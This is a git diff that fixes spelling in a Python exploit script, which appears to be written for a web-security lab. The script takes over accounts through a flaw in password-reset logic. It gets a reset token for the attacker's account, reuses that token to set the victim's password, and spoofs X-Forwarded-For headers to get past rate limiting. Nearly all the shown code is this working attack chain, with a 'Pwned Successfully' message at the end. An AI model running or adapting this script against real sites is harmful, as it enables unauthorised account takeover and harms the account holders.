@@ -14,7 +14,7 @@ def get_session(url):
 def generate_random_ip():
     return str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))
 
-def send_resset_password_url(forgot_password_url,cookies,username):
+def send_reset_password_url(forgot_password_url,cookies,username):
     data='username='+username
     headers={
         'Cookie':cookies,
@@ -36,7 +36,7 @@ def get_email_box_url(login_url,cookies):
     print('[+] Found Email Server Link: '+email_url)
     return email_url
 
-def get_resset_password_url(email_url,cookies):
+def get_reset_password_url(email_url,cookies):
     headers={
         'Cookie':cookies,
         'X-Forwarded-For':generate_random_ip()
@@ -44,29 +44,29 @@ def get_resset_password_url(email_url,cookies):
     print('GET '+email_url)
     res=request(url=email_url,method='GET',headers=headers)
     soup=BeautifulSoup(res.content.decode(),'html.parser')
-    resset_url=soup.find('a',{'target':'_blank'}).get('href')
-    return resset_url
+    reset_url=soup.find('a',{'target':'_blank'}).get('href')
+    return reset_url
 
 
-def get_resset_token(resset_url,cookies):
+def get_reset_token(reset_url,cookies):
     headers={
         'Cookie':cookies,
         'X-Forwarded-For':generate_random_ip()
             }
-    print('GET '+resset_url)
-    res=request(url=resset_url,method='GET',headers=headers)
+    print('GET '+reset_url)
+    res=request(url=reset_url,method='GET',headers=headers)
     soup=BeautifulSoup(res.content.decode(),'html.parser')
-    resset_token=soup.find('input',{'name':'temp-forgot-password-token'}).get('value')
-    return resset_token
+    reset_token=soup.find('input',{'name':'temp-forgot-password-token'}).get('value')
+    return reset_token
 
-def set_new_passwrod(resset_url,cookies,resset_token,username,new_password):
+def set_new_passwrod(reset_url,cookies,reset_token,username,new_password):
     headers={
         'Cookie':cookies,
         'X-Forwarded-For':generate_random_ip()
             }
-    data='temp-forgot-password-token='+resset_token+'&username='+username+'&new-password-1='+new_password+'&new-password-2='+new_password
-    print('POST '+resset_token+'  '+data)
-    res=request(url=resset_url,method='POST',headers=headers,data=data)
+    data='temp-forgot-password-token='+reset_token+'&username='+username+'&new-password-1='+new_password+'&new-password-2='+new_password
+    print('POST '+reset_token+'  '+data)
+    res=request(url=reset_url,method='POST',headers=headers,data=data)
 
 def login(login_url,cookies,username,password):
     headers={
@@ -78,15 +78,15 @@ def login(login_url,cookies,username,password):
     res=request(url=login_url,method='POST',headers=headers,data=data)
     return res
 
-def pwn(url,attacker_username,victime_username, new_password):
+def pwn(url,attacker_username,victim_username, new_password):
     cookies=get_session(url)
     email_url=get_email_box_url(url+'login',cookies)
-    send_resset_password_url(url+'forgot-password',cookies,attacker_username)
-    resset_password_url=get_resset_password_url(email_url,cookies)
-    resset_token=get_resset_token(resset_password_url,cookies)
-    set_new_passwrod(url+'forgot-password',cookies,resset_token,victime_username,new_password)
-    login(url+'login',cookies,victime_username,new_password)
-    print("[+] Pwned Successfully : Now Username is: "+victime_username+'  New Password is: '+new_password)
+    send_reset_password_url(url+'forgot-password',cookies,attacker_username)
+    reset_password_url=get_reset_password_url(email_url,cookies)
+    reset_token=get_reset_token(reset_password_url,cookies)
+    set_new_passwrod(url+'forgot-password',cookies,reset_token,victim_username,new_password)
+    login(url+'login',cookies,victim_username,new_password)
+    print("[+] Pwned Successfully : Now Username is: "+victim_username+'  New Password is: '+new_password)
 
 if __name__ == "__main__":
  print("""
@@ -97,4 +97,4 @@ if __name__ == "__main__":
  if len(argv)==5:
      pwn(argv[1],argv[2],argv[3],argv[4])
  else:
-     print("call it with : ./pwn-auth-password-reset-broken-logic.py <url> <attacker username>  <victime_username> <new victime password> ")
+     print("call it with : ./pwn-auth-password-reset-broken-logic.py <url> <attacker username>  <victim_username> <new victim password> ")
